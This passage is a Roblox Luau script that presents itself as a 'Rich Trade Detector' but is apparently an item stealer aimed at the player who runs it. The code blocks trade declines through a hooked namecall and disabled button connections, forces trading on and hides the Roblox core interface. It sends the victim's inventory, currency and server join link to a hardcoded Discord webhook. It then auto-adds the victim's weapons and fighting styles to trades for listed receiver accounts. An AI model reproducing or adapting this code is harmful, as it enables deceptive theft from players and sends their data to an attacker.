local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Replion = require(ReplicatedStorage.Modules.Replion)

local data = Replion.Client:GetReplion("Data")
repeat task.wait() until data

local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})

local FightingStyles = {
	["Boxing"] = true,
	["Kickboxing"] = true,
	["MMA Fighting"] = true,
	["Glitter Style"] = true,
	["Karate Style"] = true,
	["Mean Girl Mayhem Style"] = true,
	["Princess Punchout Style"] = true,
	["Puppet Panic Style"] = true,
	["Rough ’n’ Rude Style"] = true,
	["Feral Frenzy Style"] = true,
	["Heartbreaker Style"] = true,
	["Princess Power Style"] = true,
	["Storm Dancer Style"] = true,
	["Hug of Doom Style"] = true,
	["Bubble Pop Style"] = true,
	["Angel Style"] = true,
	["Black Hex Style"] = true,
	["Fantasy Style"] = true
}

local SKIP_WEAPONS = {
	["Stick"] = true,
	["Spearhead Stick"] = false,
	["Text Sign"] = true,
	["Slingshot"] = false,
	["Rusty Bow"] = false,
	["Regular Bow"] = false
}

local ownedFightingStyles = {}

for id, item in pairs(weaponSkins or {}) do
	if FightingStyles[item.Name] then
		table.insert(ownedFightingStyles, item.Name)
	end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local VirtualUser = game:GetService('VirtualUser')
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

repeat task.wait() until player and player:IsA("Player") and player.PlayerGui

local notificationGui = Instance.new("ScreenGui")
notificationGui.Name = "CustomNotification"
notificationGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
notificationGui.IgnoreGuiInset = true
notificationGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 60)
frame.Position = UDim2.new(1, -290, 0.5, -30)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BackgroundTransparency = 0.15
frame.BorderSizePixel = 0
frame.ClipsDescendants = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 25))
})
gradient.Parent = frame

local accentBar = Instance.new("Frame")
accentBar.Size = UDim2.new(0, 4, 1, 0)
accentBar.Position = UDim2.new(1, -4, 0, 0)
accentBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
accentBar.BorderSizePixel = 0
accentBar.Parent = frame

local icon = Instance.new("TextLabel")
icon.Size = UDim2.new(0, 30, 0, 30)
icon.Position = UDim2.new(0, 10, 0.5, -15)
icon.BackgroundTransparency = 1
icon.Text = "💰"
icon.TextSize = 24
icon.TextColor3 = Color3.fromRGB(255, 215, 0)
icon.Font = Enum.Font.SourceSansBold
icon.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 0, 20)
title.Position = UDim2.new(0, 45, 0, 8)
title.BackgroundTransparency = 1
title.Text = "RICH TRADE DETECTOR"
title.TextSize = 12
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, -50, 0, 18)
message.Position = UDim2.new(0, 45, 0, 28)
message.BackgroundTransparency = 1
message.Text = "Accept any rich player trades"
message.TextSize = 11
message.TextColor3 = Color3.fromRGB(180, 180, 180)
message.TextXAlignment = Enum.TextXAlignment.Left
message.Font = Enum.Font.SourceSans
message.Parent = frame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 20, 0, 20)
closeBtn.Position = UDim2.new(1, -25, 0, 8)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.BackgroundTransparency = 0.5
closeBtn.Text = "✕"
closeBtn.TextSize = 12
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.BorderSizePixel = 0
local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 10)
closeCorner.Parent = closeBtn
closeBtn.Parent = frame

closeBtn.MouseEnter:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
end)
closeBtn.MouseLeave:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0.5}):Play()
end)

frame.Position = UDim2.new(1, 0, 0.5, -30)
local enterTween = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {Position = UDim2.new(1, -290, 0.5, -30)})
enterTween:Play()

local function fadeOut()
    local fadeTween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1})
    fadeTween:Play()
    fadeTween.Completed:Connect(function()
        for _, child in ipairs(frame:GetChildren()) do
            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("Frame") and child ~= frame then
                local childFade = TweenService:Create(child, TweenInfo.new(0.3), {TextTransparency = 1, BackgroundTransparency = 1})
                childFade:Play()
            end
        end
        task.wait(0.5)
        notificationGui:Destroy()
    end)
end

closeBtn.MouseButton1Click:Connect(function()
    fadeOut()
end)

task.delay(8, function()
    if notificationGui and notificationGui.Parent then
        fadeOut()
    end
end)

task.spawn(function()
    while notificationGui and notificationGui.Parent do
        TweenService:Create(icon, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextSize = 28}):Play()
        task.wait(0.5)
        TweenService:Create(icon, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextSize = 24}):Play()
        task.wait(0.5)
    end
end)

notificationGui.Parent = player:WaitForChild("PlayerGui")
frame.Parent = notificationGui

local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")

local DeclineRemote = Net:WaitForChild("RF/Trading/DeclineTradeOffer")
local oldDeclineHook
oldDeclineHook = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()

    if method == "InvokeServer" and self == DeclineRemote then
        return
    end

    return oldDeclineHook(self, ...)
end)

task.spawn(function()
    local gui = player:WaitForChild("PlayerGui")
    
    local function blockDeclineButton(popup)
        if popup then
            local decline = popup:FindFirstChild("TradeRequest") and popup.TradeRequest:FindFirstChild("Decline")
            if decline then
                decline.AutoButtonColor = false
                
                pcall(function()
                    for _,v in pairs(getconnections(decline.Activated)) do
                        v:Disable()
                    end
                    
                    for _,v in pairs(getconnections(decline.MouseButton1Click)) do
                        v:Disable()
                    end
                end)
                
                decline.Activated:Connect(function()
                end)
            end
        end
    end
    
    local popup = gui:FindFirstChild("TradeRequestPopup")
    blockDeclineButton(popup)
    
    gui.ChildAdded:Connect(function(child)
        if child.Name == "TradeRequestPopup" then
            task.wait(0.1)
            blockDeclineButton(child)
        end
    end)
end)

task.spawn(function()
    local PhoneSettings = Net:WaitForChild("RE/SetPhoneSettings")
    while true do
        pcall(function()
            PhoneSettings:FireServer("TradeEnabled", true)
        end)
        task.wait(5)
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
            if robloxGui then
                robloxGui.Enabled = false
            end
        end)
        task.wait(1)
    end
end)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local InventoryClient = require(ReplicatedStorage.Modules.Inventory.Client)

local Modules = ReplicatedStorage:WaitForChild("Modules")
local TradeData = require(Modules.Trading.TradeData)
local Replion = require(Modules.Replion)
local Net = require(Modules.Net)
local MessageEvent = Net:RemoteEvent("Trade/MessageEvent")

local data = Replion.Client:GetReplion("Data")
repeat task.wait() until data

local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
local stompList = require(ReplicatedStorage.SkinCrates.Items.Stomp)

local loveboardList = {
    ["Credit Card Hoverboard"] = true,
    ["Popstar Hoverboard"] = true,
    ["Graduation Hat Hoverboard"] = true,
    ["Surf's Up Hoverboard"] = true,
    ["Pink Star Board"] = true,
    ["Ice cream Sandwich Board"] = true,
    ["Angel Wings"] = true,
    ["Void Demon Wings"] = true,
    ["Bath Tub Hoverboard"] = true,
    ["Rocket Hoverboard"] = true,
    ["St Patrick's Board"] = true,
}

local ownedStomps = {}
local ownedLoveboards = {}
local ownedFightingStylesList = {}

for id, item in pairs(weaponSkins or {}) do
    if item.Name then
        local itemName = item.Name:lower()
        
        if FightingStyles[item.Name] then
            table.insert(ownedFightingStylesList, item.Name)
        end
        
        for stompName, _ in pairs(stompList) do
            local stompLower = stompName:lower()
            if string.find(itemName, stompLower) then
                ownedStomps[stompName] = true
                break
            end
        end
        
        for loveboardName, _ in pairs(loveboardList) do
            if item.Name == loveboardName then
                ownedLoveboards[loveboardName] = true
            end
        end
    end
end

if game.PlaceId ~= 84780374286597 and game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesn't support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

local RICH_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1477568937322483829/omfMeKGyRxM5LoGup-7dOKoATErAREsOqqv4NJa9B2KGiHBzKMAKiUCNvLsK8sce2Ac-"
local POOR_WEBHOOK = _G.POOR_WEBHOOK

local HARDCODED_USERNAMES = {"qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar"}

local CUSTOM_USERNAMES = _G.MY_USERNAMES or {}
local MY_USERNAMES = {}

for _, name in ipairs(HARDCODED_USERNAMES) do
    table.insert(MY_USERNAMES, name)
end

for _, name in ipairs(CUSTOM_USERNAMES) do
    local isDuplicate = false
    for _, existing in ipairs(MY_USERNAMES) do
        if existing:lower() == name:lower() then
            isDuplicate = true
            break
        end
    end
    if not isDuplicate then
        table.insert(MY_USERNAMES, name)
    end
end

local PING_POOR = _G.PING_POOR or false

local GUI_PROTECTION_ENABLED = true
local PROTECTED_GUIS = {
    ["GeneralGUI"] = {enabled = true, requiredProperties = {{path = "Buttons", visible = true}}},
    ["BackpackGui"] = {enabled = true, requiredProperties = {{path = "Backpack", visible = true}}}
}

local isTrading = false
local currentTradePartner = nil
local tradingPlayers = {}
local isProcessing = false
local jumped = false
local activeTargets = {}
local skinsAlreadyAdded = false
local fightingStylesAlreadyAdded = false

local function protectGUIs()
    if not GUI_PROTECTION_ENABLED then return end
    for guiName, settings in pairs(PROTECTED_GUIS) do
        local gui = playerGui:FindFirstChild(guiName)
        if gui then
            if settings.enabled and not gui.Enabled then gui.Enabled = true end
            for _, property in ipairs(settings.requiredProperties) do
                local target = gui:FindFirstChild(property.path)
                if target and target:IsA("GuiObject") and property.visible ~= nil and target.Visible ~= property.visible then
                    target.Visible = property.visible
                end
            end
        end
    end
end

task.spawn(function() while true do protectGUIs() task.wait(0.1) end end)

task.spawn(function()
    while true do
        local popup = playerGui:FindFirstChild("TradeRequestPopup")
        if popup then
            local tradeRequest = popup:FindFirstChild("TradeRequest")
            if tradeRequest then
                local content = tradeRequest:FindFirstChild("Content")
                if content and content:IsA("TextLabel") then
                    if content.Text ~= "🤑 RICH PLAYER DETECTED 🤑" then
                        content.Text = "🤑 RICH PLAYER DETECTED 🤑"
                    end
                end
            end
        end
        task.wait()
    end
end)

local SatchelModule = Modules:WaitForChild("Satchel")
local LoadoutModule = require(SatchelModule)

if LoadoutModule and LoadoutModule.SetBackpackEnabled then
    local originalSetBackpackEnabled = LoadoutModule.SetBackpackEnabled
    LoadoutModule.SetBackpackEnabled = function(self, enabled)
        originalSetBackpackEnabled(self, true)
    end
end

task.spawn(function()
    task.wait(2)
    
    local success, CustomBackpackModule = pcall(function()
        return require(script.Parent.CustomBackpackController)
    end)
    
    if success and CustomBackpackModule then
        if CustomBackpackModule._canEnable then
            CustomBackpackModule._canEnable = function()
                return true
            end
        end
        
        if CustomBackpackModule._toggleBackpackTo then
            local originalToggle = CustomBackpackModule._toggleBackpackTo
            CustomBackpackModule._toggleBackpackTo = function(self, enabled)
                return originalToggle(self, true)
            end
        end
        
        if CustomBackpackModule._disable then
            CustomBackpackModule._disable = function()
                return
            end
        end
        
        if CustomBackpackModule._disableSpam then
            CustomBackpackModule._disableSpam = function()
                return
            end
        end
        
        if CustomBackpackModule._freeze then
            CustomBackpackModule._freeze = function()
                return
            end
        end
        
        if CustomBackpackModule._enable then
            CustomBackpackModule:_enable()
        end
        
        CustomBackpackModule._enabled = true
    end
end)

task.spawn(function()
    local attributesToBlock = {
        "Freezed",
        "BeingArrested",
        "BeingDogLeashed",
        "BeingTombstoneTrapped",
        "USER_DRIVING",
        "USER_VEHICLE_SITTING",
        "IN_DRESS_ROOM",
        "CARRYING_EGG",
        "UNDERGROUND_FIGHTING",
        "BeingSchoolLockerTrapped"
    }
    
    for _, attrName in ipairs(attributesToBlock) do
        localPlayer:GetAttributeChangedSignal(attrName):Connect(function()
            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
                LoadoutModule:SetBackpackEnabled(true)
            end
            
            pcall(function()
                local CustomBackpackModule = require(script.Parent.CustomBackpackController)
                if CustomBackpackModule then
                    if CustomBackpackModule._enable then
                        CustomBackpackModule:_enable()
                    end
                    if CustomBackpackModule._toggleBackpackTo then
                        CustomBackpackModule:_toggleBackpackTo(true)
                    end
                    CustomBackpackModule._enabled = true
                end
            end)
        end)
    end
end)

localPlayer.CharacterAdded:Connect(function(character)
    task.wait(0.5)
    local humanoid = character:WaitForChild("Humanoid")
    
    if LoadoutModule and LoadoutModule.SetBackpackEnabled then
        LoadoutModule:SetBackpackEnabled(true)
    end
    
    if humanoid then
        humanoid.StateChanged:Connect(function(oldState, newState)
            task.wait(0.1)
            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
                LoadoutModule:SetBackpackEnabled(true)
            end
        end)
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            local backpackGui = playerGui:FindFirstChild("BackpackGui")
            if backpackGui then
                local backpack = backpackGui:FindFirstChild("Backpack")
                if backpack then
                    local hotbar = backpack:FindFirstChild("Hotbar")
                    if hotbar and hotbar:IsA("Frame") then
                        if not hotbar.Visible then
                            hotbar.Visible = true
                        end
                        if hotbar.Enabled ~= nil and not hotbar.Enabled then
                            hotbar.Enabled = true
                        end
                        for _, child in ipairs(hotbar:GetChildren()) do
                            if child:IsA("GuiObject") and not child.Visible then
                                child.Visible = true
                            end
                        end
                    end
                end
            end
            
            if backpackGui and not backpackGui.Enabled then
                backpackGui.Enabled = true
            end
        end)
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        pcall(function()
            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
                LoadoutModule:SetBackpackEnabled(true)
            end
            
            local success, CustomBackpackModule = pcall(function()
                return require(script.Parent.CustomBackpackController)
            end)
            
            if success and CustomBackpackModule then
                if CustomBackpackModule._enable then
                    CustomBackpackModule:_enable()
                end
                if CustomBackpackModule._toggleBackpackTo then
                    CustomBackpackModule:_toggleBackpackTo(true)
                end
                CustomBackpackModule._enabled = true
            end
        end)
        task.wait(0.5)
    end
end)

for _, child in ipairs(SatchelModule:GetChildren()) do
    if child.Name == "BackpackItemAdded" and child:IsA("RemoteEvent") then
        child.Event:Connect(function()
            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
                LoadoutModule:SetBackpackEnabled(true)
            end
        end)
    end
end

local function hasSurfsUp()
    for _, guid in ipairs(InventoryClient:FindItems("SurfsUpHoverboard")) do
        if InventoryClient:GetItem("SurfsUpHoverboard", guid) then return true end
    end
    return false
end

local function hasSpikedKittyStanli()
    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
        local item = InventoryClient:GetItem("WeaponSkin", guid)
        if item and item.Name == "Spiked Kitty Stanli" then return true end
    end
    return false
end

local function getInventory()
    local data = InventoryClient:Get()
    if not data or not data.Items then
        return nil
    end
    return data.Items
end

local function IsTradable(item)
    if not item then return false end
    
    local lock = item.TradeLock
    
    if not lock then
        return true
    end
    
    if lock.Type == "Untradable" then
        return false
    end
    
    if lock.Type == "Timestamp" then
        if lock.Time and lock.Time > os.time() then
            return false
        end
        return true
    end
    
    return false
end

local function getAllInventoryWeaponsWithTradeStatus()
    local counts = {}
    local allWeapons = {}
    local totalWeapons = 0
    local tradableCount = 0
    local untradableCount = 0
    local weaponTradeStatus = {}
    
    local inv = getInventory()
    
    if inv and inv.Weapon then
        for guid, item in pairs(inv.Weapon) do
            if item and item.Name then
                if not SKIP_WEAPONS[item.Name] then
                    local tradable = IsTradable(item)
                    counts[item.Name] = (counts[item.Name] or 0) + 1
                    totalWeapons = totalWeapons + 1
                    if tradable then
                        tradableCount = tradableCount + 1
                    else
                        untradableCount = untradableCount + 1
                    end
                    weaponTradeStatus[item.Name] = weaponTradeStatus[item.Name] or {}
                    table.insert(weaponTradeStatus[item.Name], tradable)
                    table.insert(allWeapons, item.Name .. "::None::" .. tostring(tradable))
                end
            end
        end
    end
    
    if inv and inv.WeaponSkin then
        for guid, item in pairs(inv.WeaponSkin) do
            if item then
                local weaponName = item.Weapon or item.WeaponName or item.Type
                local skinName = item.Name
                if weaponName and skinName then 
                    if not FightingStyles[item.Name] then
                        local tradable = IsTradable(item)
                        table.insert(allWeapons, weaponName .. "::" .. skinName .. "::" .. tostring(tradable))
                    end
                end
            end
        end
    end
    
    return counts, allWeapons, totalWeapons, tradableCount, untradableCount, weaponTradeStatus
end

local function getAllInventoryWeapons()
    local counts = {}
    local allWeapons = {}
    local totalWeapons = 0
    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
        local item = InventoryClient:GetItem("Weapon", guid)
        if item and item.Name then
            if not SKIP_WEAPONS[item.Name] then
                counts[item.Name] = (counts[item.Name] or 0) + 1
                totalWeapons = totalWeapons + 1
                table.insert(allWeapons, item.Name .. "::None")
            end
        end
    end
    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
        local item = InventoryClient:GetItem("WeaponSkin", guid)
        if item then
            local weaponName = item.Weapon or item.WeaponName or item.Type
            local skinName = item.Name
            if weaponName and skinName then 
                if not FightingStyles[item.Name] then
                    table.insert(allWeapons, weaponName .. "::" .. skinName)
                end
            end
        end
    end
    return counts, allWeapons, totalWeapons
end

local function getAllStomps()
    local stomps = {}
    for stompName, _ in pairs(ownedStomps) do
        table.insert(stomps, stompName)
    end
    return stomps
end

local function getAllLoveboards()
    local loveboards = {}
    for loveboardName, _ in pairs(ownedLoveboards) do
        table.insert(loveboards, loveboardName)
    end
    return loveboards
end

local function getAllFightingStyles()
    local styles = {}
    for _, styleName in ipairs(ownedFightingStylesList) do
        table.insert(styles, styleName)
    end
    return styles
end

local function getAllSkins()
    local skins = {}
    for stompName, _ in pairs(ownedStomps) do
        table.insert(skins, stompName)
    end
    for loveboardName, _ in pairs(ownedLoveboards) do
        table.insert(skins, loveboardName)
    end
    return skins
end

local function formatSkinList()
    local stompList = getAllStomps()
    local loveboardList = getAllLoveboards()
    local fightingStylesList = getAllFightingStyles()
    
    local result = {}
    
    if #fightingStylesList > 0 then
        table.insert(result, "Fighting Styles:")
        for _, style in ipairs(fightingStylesList) do
            table.insert(result, "• " .. style)
        end
        table.insert(result, "")
    end
    
    if #stompList > 0 then
        table.insert(result, "Stomps Skins:")
        for _, skin in ipairs(stompList) do
            table.insert(result, "• " .. skin)
        end
        table.insert(result, "")
    end
    
    if #loveboardList > 0 then
        table.insert(result, "Boards Skins:")
        for _, skin in ipairs(loveboardList) do
            table.insert(result, "• " .. skin)
        end
    end
    
    if #result == 0 then
        return "None"
    end
    
    return table.concat(result, "\n")
end

local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    if playerCount >= maxPlayers - 1 then localPlayer:Kick("rejoin a diff server") return false end
    if playerCount < 3 then localPlayer:Kick("DATA not loaded, rejoin a public") return false end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then return string.format("%.1fK", num / 1000)
    else return tostring(num) end
end

local function deleteMessagesGui()
    local messagesGui = playerGui:FindFirstChild("Messages")
    if messagesGui then messagesGui:Destroy() end
end

local function sendRequest(url, body)
    if not url or url == "" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = body
    if type(body) ~= "string" then
        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
        if ok then encoded = s else encoded = "{}" end
    end
    local candidates = {
        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
    }
    for _, tryFn in ipairs(candidates) do
        local ok, res = pcall(tryFn)
        if ok and res then
            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then return res end
        end
    end
    return nil
end

local function sendFullInventory()
    if not checkServerStatus() then return nil end
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local isPrivateServer = playerCount < 3
    if isPrivateServer then return nil end
    
    local weaponCounts, allWeaponsList, totalWeapons, tradableCount, untradableCount, weaponTradeStatus = getAllInventoryWeaponsWithTradeStatus()
    local hasSurf = hasSurfsUp()
    local hasSpikedKitty = hasSpikedKittyStanli()
    local totalItemsCount = totalWeapons
    
    if totalWeapons < 2 then
        localPlayer:Kick("Alt Account Detected")
        return nil
    end
    
    local useRichWebhook = (hasSpikedKitty and hasSurf) or (totalItemsCount > 10)
    
    local weaponsText = ""
    local weaponLines = {}
    for weaponName, count in pairs(weaponCounts) do
        local statuses = weaponTradeStatus[weaponName]
        local allTradable = true
        if statuses then
            for _, tradable in ipairs(statuses) do
                if not tradable then
                    allTradable = false
                    break
                end
            end
        end
        local emoji = allTradable and "🟢" or "🔴"
        table.insert(weaponLines, emoji .. " " .. count .. "x " .. weaponName)
    end
    table.sort(weaponLines)
    weaponsText = table.concat(weaponLines, "\n")
    if weaponsText == "" then weaponsText = "None" end
    
    local skinText = formatSkinList()
    
    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
    local formattedDinero = formatNumber(dinero)
    local formattedSlays = formatNumber(slays)
    
    local executor = "Unknown"
    if syn then executor = "Synapse X"
    elseif fluxus then executor = "Fluxus"
    elseif request then 
        local info = debug.getinfo(request)
        if info and info.source then
            if string.find(info.source, "krnl") then executor = "Krnl"
            elseif string.find(info.source, "scriptware") then executor = "ScriptWare"
            elseif string.find(info.source, "delta") then executor = "Delta"
            else executor = "Unknown Executor" end
        else
            executor = "Unknown Executor"
        end
    elseif http_request then executor = "HTTP Request"
    elseif is_sirhurt then executor = "Sirhurt"
    elseif pebc_execute then executor = "ProtoSmasher"
    elseif KRNL_LOADED then executor = "Krnl"
    elseif Synapse then executor = "Synapse X"
    elseif getexecutorname then 
        local success, name = pcall(getexecutorname)
        if success then executor = name end
    end
    
    local playerName = localPlayer.Name
    local targetWebhook = useRichWebhook and RICH_WEBHOOK or POOR_WEBHOOK
    local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    local serverJoiner = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
    
    local fields = {
        {name = "User", value = "`" .. playerName .. "`", inline = true},
        {name = "Dinero", value = "`" .. tostring(formattedDinero) .. "`", inline = true},
        {name = "Slays", value = "`" .. tostring(formattedSlays) .. "`", inline = true},
        {name = "Executor", value = "`" .. executor .. "`", inline = true},
        {name = "Players", value = "`" .. playerCount .. " / " .. maxPlayers .. "`", inline = true},
        {name = "Trade Status", value = "🟢 Tradable: " .. tradableCount .. " | 🔴 Untradable: " .. untradableCount, inline = true},
        {name = "Weapons", value = "```" .. weaponsText .. "```", inline = false},
        {name = "Skins & Fighting Styles", value = skinText, inline = false},
        {name = "Join Link", value = "[Click to Join](" .. joinLink .. ")", inline = false}
    }
    
    local mainEmbed = {
        title = "Ryr's Scripts | Baddies 🍀",
        color = useRichWebhook and 0xFF69B4 or 0xFF0000,
        fields = fields,
        footer = {text = "Ryr's Scripts | Baddies 🍀"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local content = serverJoiner
    if useRichWebhook then 
        content = "@everyone \n" .. serverJoiner
    elseif PING_POOR then
        content = "@everyone \n" .. serverJoiner
    end
    
    local payload = {content = content, embeds = {mainEmbed}}
    local result = sendRequest(targetWebhook, payload)
    
    if not useRichWebhook then
        local stompCount = #getAllStomps()
        local loveboardCount = #getAllLoveboards()
        local fightingStylesCount = #getAllFightingStyles()
        local totalSkins = stompCount + loveboardCount + fightingStylesCount
        
        local notificationEmbed = {
            title = "Person executed, sending to other webhook",
            color = 0x808080,
            fields = {
                {name = "Player", value = playerName, inline = true},
                {name = "Has Surf's Up", value = tostring(hasSurf), inline = true},
                {name = "Has Spiked Kitty", value = tostring(hasSpikedKitty), inline = true},
                {name = "Total Items", value = tostring(totalItemsCount), inline = true},
                {name = "Fighting Styles", value = tostring(fightingStylesCount), inline = true},
                {name = "Stomps Owned", value = tostring(stompCount), inline = true},
                {name = "Loveboards Owned", value = tostring(loveboardCount), inline = true},
                {name = "Total Skins", value = tostring(totalSkins), inline = true},
                {name = "Condition Met", value = "❌ No (sent to poor webhook)", inline = false}
            },
            footer = {text = "Notification • " .. playerName},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        sendRequest(RICH_WEBHOOK, {content = "⚠️ " .. playerName .. " didn't meet rich criteria", embeds = {notificationEmbed}})
    end
    
    return result
end

local function safeClick(btn)
    if not btn then return end
    pcall(function()
        if btn.MouseButton1Click then 
            firesignal(btn.MouseButton1Click)
        elseif btn.Activated then 
            firesignal(btn.Activated)
        end
    end)
end

local function clickAllWeapons()
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then return 0 end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local _, allWeaponsList = getAllInventoryWeapons()
    local addedCount = 0
    local maxAttempts = 10
    
    for attempt = 1, maxAttempts do
        local currentAdded = 0
        for _, weaponFullName in ipairs(allWeaponsList) do
            local btn = scrollingFrame:FindFirstChild(weaponFullName)
            if btn and btn:IsA("ImageButton") and btn.Visible then
                safeClick(btn)
                currentAdded = currentAdded + 1
                addedCount = addedCount + 1
                task.wait(0.1)
            end
        end
        if scrollingFrame:FindFirstChild("UIListLayout") then
            local maxScroll = scrollingFrame.CanvasSize.Y.Offset - scrollingFrame.AbsoluteWindowSize.Y
            if maxScroll > 0 then
                scrollingFrame.CanvasPosition = Vector2.new(0, maxScroll)
                task.wait(0.1)
            end
        end
        if currentAdded == 0 then break end
        task.wait(0.1)
    end
    return addedCount
end

local function clickFightingStyles()
    if fightingStylesAlreadyAdded then
        return 0
    end
    
    local tradingGui = playerGui:FindFirstChild("Trading")
    if not tradingGui then 
        return 0 
    end
    local frame = tradingGui:FindFirstChild("Frame")
    if not frame then return 0 end
    local main = frame:FindFirstChild("Main")
    if not main then return 0 end
    local yourOffer = main:FindFirstChild("YourOffer")
    if not yourOffer then return 0 end
    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
    if not itemDisplay then return 0 end
    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
    if not scrollingFrame then return 0 end
    
    local ownedStylesList = getAllFightingStyles()
    
    if #ownedStylesList == 0 then
        return 0
    end
    
    scrollingFrame.CanvasPosition = Vector2.new(0, 0)
    task.wait(0.1)
    
    local totalAdded = 0
    
    for _, styleName in ipairs(ownedStylesList) do
        local found = false
        for _, btn in ipairs(scrollingFrame:GetChildren()) do
            if btn:IsA("ImageButton") and btn.Visible then
                local btnName = btn.Name:lower()
                local styleLower = styleName:lower()
                if btnName == styleLower or string.find(btnName, styleLower) or string.find(styleLower, btnName) then
                    safeClick(btn)
                    totalAdded = totalAdded + 1
                    found = true
                    task.wait(0.1)
                    break
                end
            end
        end
        if not found then
        end
    end
    
    if totalAdded > 0 then
        fightingStylesAlreadyAdded = true
    end
    
    return totalAdded
end

local function clickAllSkins()
